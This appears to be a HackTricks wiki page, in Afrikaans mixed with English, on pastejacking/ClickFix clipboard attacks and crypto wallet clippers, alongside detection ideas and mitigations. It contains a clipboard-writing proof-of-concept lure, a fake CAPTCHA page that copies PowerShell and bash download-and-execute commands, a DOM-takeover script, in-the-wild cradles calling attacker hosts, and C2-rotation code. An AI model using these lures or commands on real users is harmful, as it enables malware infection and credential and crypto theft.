# Clipboard Hijacking (Pastejacking)-aanvalle

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – buit die feit uit dat gebruikers gereeld opdragte copy-and-paste sonder om dit te inspekteer. ’n Kwaadwillige webblad (of enige JavaScript-capable konteks soos ’n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die system clipboard. Slagoffers word gewoonlik deur sorgvuldig saamgestelde social-engineering-instruksies aangemoedig om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminal oop te maak en die clipboard-inhoud te *paste*, wat onmiddellik arbitrêre opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen attachment oopgemaak word nie**, omseil die tegniek die meeste e-mail- en web-content-sekuriteitskontroles wat attachments, macros of direkte command execution monitor. Die aanval is daarom gewild in phishing campaigns wat commodity malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Nog ’n **clipboard hijacking**-variant paste glad nie opdragte nie: dit wag totdat die slagoffer ’n **cryptocurrency wallet address** kopieer en vervang dit dan stilweg met een wat deur die aanvaller beheer word, net voordat dit geplak word. Dit is veral effektief teen lang wallet-formate omdat gebruikers dikwels slegs die eerste/laaste karakters verifieer.<sup>[[8]](#references)</sup>

Algemene eienskappe in die werklike wêreld:
- **Thin loader + nested payload**: die sigbare app/exe lyk soos ’n wettige trading- of "profit"-tool, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld ’n .NET loader wat ’n nested Rust payload launch).
- **Regex-driven replacement**: die malware match strings soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-character Solana-like** strings en herskryf dit na attacker wallets.
- **Wallet rotation at scale**: moderne Windows-samples kan **duisende** replacement wallets per currency embed in plaas van ’n enkele statiese address, wat wallet reputation burn ná elke theft verminder.<sup>[[8]](#references)</sup>

### Windows clipper flow

’n Algemene implementering is ’n hidden window wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard update call die malware tipies:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kry toegang tot die huidige clipboard data.
- **`GetClipboardData`** → lees teks.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet string met die attacker value.

Minimal hunting regexes wat gereeld in clippers voorkom:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Gebruikersvlak-persistentie is voldoende vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
- Kopieer payload na **`%APPDATA%\silke\silke.exe`**
- Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat clipboard-API’s voortdurend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
- Nuwe LNK-/executable-skepping, gevolg deur herskrywings van wallet-addresses in die clipboard.
- Archives of fake-software-bundels wat baie ongebruikte lêers bevat, plus ’n klein launcher wat ’n geneste binary start.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Op macOS versprei sommige veldtogte ’n **`unlocker.command`**-helper en gee die slagoffer opdrag om regs te klik → **Open** indien Gatekeeper sê dat die app beskadig is of van ’n onbekende developer afkomstig is. Die script verwyder bloot quarantine en launch die nabygeleë `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** wat die feit misbruik dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>

Na uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`

'n Nuttige defensiewe detail is dat sommige samples 'n **self-healing watchdog** implementeer wat die LaunchAgent en wrapper elke ~30 sekondes herskryf. As jy die plist eerste verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimingsvolgorde:
1. Kill die aktiewe clipper-proses.
2. Unload/delete die LaunchAgent plist.
3. Delete `~/launch.sh` en die gekopieerde payload.

### Delivery note: fake reputation as a force multiplier

Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **distribution layer** die swaar werk doen: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views en onskadelik lykende VirusTotal comments/votes word gebruik om die binary betroubaar te laat voorkom voordat dit uitgevoer word.<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

Sommige macOS-infostealers kloon installer-webwerwe (byvoorbeeld Homebrew) en **force use of a “Copy” button** sodat gebruikers nie net die sigbare teks kan highlight nie. Die clipboard-inskrywing bevat die verwagte installer command plus 'n aangehegte Base64-payload (byvoorbeeld `...; echo <b64> | base64 -d | sh`), sodat een paste albei uitvoer terwyl die UI die ekstra stage versteek.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwes steun op die asinchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Die ClickFix / ClearFake-vloei

1. Gebruiker besoek ’n typosquatted- of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingespuitte **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-geënkodeerde PowerShell one-liner in die clipboard stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die command en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n legitieme executable plus ’n malicious DLL bevat (klassieke DLL sideloading).
5. Die loader dekripteer addisionele stages, inject shellcode en installeer persistence (bv. scheduled task) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer uitvoer.<sup>[[1]](#references)</sup>

### Voorbeeld van NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (wettige Java WebStart) soek in sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL resolve API's dinamies met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met 'n rolling XOR key `"https://google.com/"`, injecteer die finale shellcode en unzip **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal ’n MSI payload op → plaas `libcef.dll` langs ’n signed application → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep loods ’n versteekte PowerShell-script wat `PartyContinued.exe` verkry, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` deur middel van `extrac32` en lêersamevoeging rekonstrueer, en uiteindelik ’n `.a3x`-script uitvoer wat blaaier-aanmeldbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>

## ClickFix: Knipbord → PowerShell → JS eval → Startup LNK met roterende C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers die opdrag om ’n one-liner te plak wat JavaScript via WSH haal en uitvoer, dit volhardend maak en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Verdoeselde URL word tydens looptyd omgekeer om oppervlakkige inspeksie te omseil.
- JavaScript behou homself via ’n Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.<sup>[[3]](#references)</sup>

Minimale JS-fragment wat gebruik word om C2’s volgens datum te roteer:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels deur TLS aan ’n hardcoded sertifikaat te koppel en verkeer in chunks op te deel.<sup>[[3]](#references)</sup>

Detection-idees spesifiek vir hierdie variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript met ’n JS-path onder `%TEMP%`/`%APPDATA%` uitvoer.
- Registry/RunMRU- en command-line-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang scripts te voer sonder lang command lines.
- Scheduled Tasks wat daarna LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n updater-agtige task/path (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2-hostname en URL’s wat daagliks roteer, met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelleer clipboard write-events wat gevolg word deur Win+R paste en daarna onmiddellike `powershell.exe`-execution.

Blue-teams kan clipboard-, process-creation- en registry-telemetrie kombineer om pastejacking-misbruik te identifiseer:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-commands by – soek ongewone Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } is.
* Event ID **4663** vir file creations onder `%LocalAppData%\Microsoft\Windows\WinX\` of temporary folders net voor die verdagte 4688-event.
* EDR clipboard sensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik deur ’n nuwe PowerShell-process gevolg word.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse campaigns produseer groot hoeveelhede vals CDN/browser-verification pages ("Just a moment…", IUAM-style) wat gebruikers dwing om OS-spesifieke commands vanaf hul clipboard na native consoles te kopieer. Dit verskuif execution uit die browser-sandbox en werk oor Windows en macOS heen.<sup>[[4]](#references)</sup>

Belangrikste eienskappe van die builder-generated pages
- OS-detection via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele decoys/no-ops vir unsupported OS’e om die illusie te behou.
- Automatic clipboard-copy tydens onskadelike UI-actions (checkbox/Copy), terwyl die sigbare teks van die clipboard-inhoud kan verskil.
- Mobile blocking en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuscation en single-file injector om ’n compromised site se DOM met ’n Tailwind-styled verification UI te oorskryf (geen nuwe domain registration nodig nie).<sup>[[4]](#references)</sup>

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-volharding van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminaal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>

Oorneem van bladsye op gekompromitteerde werwe in plek
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Opsporings- en hunting-idees spesifiek vir IUAM-styl-lokmiddels
- Web: Bladsye wat die Clipboard API aan verification widgets bind; wanpassing tussen vertoonde teks en clipboard payload; `navigator.userAgent`-vertakking; Tailwind + single-page replace in verdagte kontekste.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch/MSI installers wat vanaf `%TEMP%` uitgevoer word.
- macOS endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` naby blaaiergebeure voortbring; agtergrondtake wat voortgaan nadat die terminaal gesluit is.
- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende skepping van console-prosesse.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix-evolusies (ClearFake, Scarlet Goldfinch)

- ClearFake gaan voort om WordPress-webwerwe te kompromitteer en loader JavaScript in te spuit wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) aanmekaar skakel, asook blockchain-“etherhiding”-calls (bv. POSTs na Binance Smart Chain API-endpoints soos `bsc-testnet.drpc[.]org`) om huidige lure logic te haal. Onlangse overlays gebruik sterk fake CAPTCHAs wat gebruikers opdrag gee om ’n one-liner (T1204.004) te copy/paste in plaas daarvan om enigiets af te laai.<sup>[[6]](#references)</sup>
- Initial execution word toenemend aan signed script hosts/LOLBAS gedelegeer. Januarie 2026-kettings het vroeëre `mshta`-gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige arguments met aliases/wildcards deurgee om remote content te haal:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; tesame met `WScript.exe` en ongewone argumente (`gal`/`gcm`-aliasse, cmdlets met jokertekens, jsDelivr-URL's) word dit ’n hoësein-LOLBAS-fase vir ClearFake.<sup>[[6]](#references)</sup>
- Vals CAPTCHA-payloads het in Februarie 2026 teruggeskuif na suiwer PowerShell-download-cradles. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die eerste chain is ’n in-memory `iex(irm ...)` grabber; die tweede stageer via `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en lanseer dit met `-ep bypass` in ’n versteekte venster.<sup>[[6]](#references)</sup>

Opsporings-/hunting-wenke vir hierdie variante
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná clipboard-skrywings/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domains, of rou IP `iex(irm ...)`-patrone.
- Network: uitgaande verbinding na CDN worker-hosts of blockchain RPC-endpoints vanaf script hosts/PowerShell kort ná web browsing.
- File/registry: skepping van tydelike `.ps1` onder `%TEMP%`, plus RunMRU-inskrywings wat hierdie een-liners bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URLs of obfuscated alias strings uitgevoer word.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Onlangse Red Canary telemetry toon dat die stabiele indicator **nie een presiese command is nie**, maar die kombinasie van **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, en **immediate execution**.<sup>[[7]](#references)</sup>

### Notable operator patterns

- **Paste confirmation telemetry**: sommige payloads roep `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` aan vóór die werklike stage. Dit bevestig user interaction terwyl die venster kort en stil gehou word.
- **Fake verification comments**: PowerShell one-liners kan strings soos `# Security check ✔️ I'm not a robot Verification ID: 138105` byvoeg sodat die command steeds CAPTCHA-verwant lyk nadat dit in Run / `cmd.exe` / PowerShell history geplak is.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n statiese URL in die command line terwyl dit steeds in-memory download-and-execute uitvoer.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone casing en Unicode-like characters in flags om brittle detections te omseil, terwyl dit steeds soos `msiexec.exe` lyk.
- **Caret-escaped LOLBin chains**: `cmd.exe` kan keywords met `^` escapes verberg (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die nested shell minimized begin, attacker content met ’n benign extension soos `.pdf` stoor, en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – deaktiveer clipboard write-access (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis user gesture.
2. Security awareness – leer users om sensitiewe commands te *tik* of dit eers in ’n text editor te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrary one-liners te blokkeer.
4. Network controls – blokkeer uitgaande requests na bekende pastejacking- en malware C2-domains.

## Related Tricks

* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat users na ’n malicious server gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
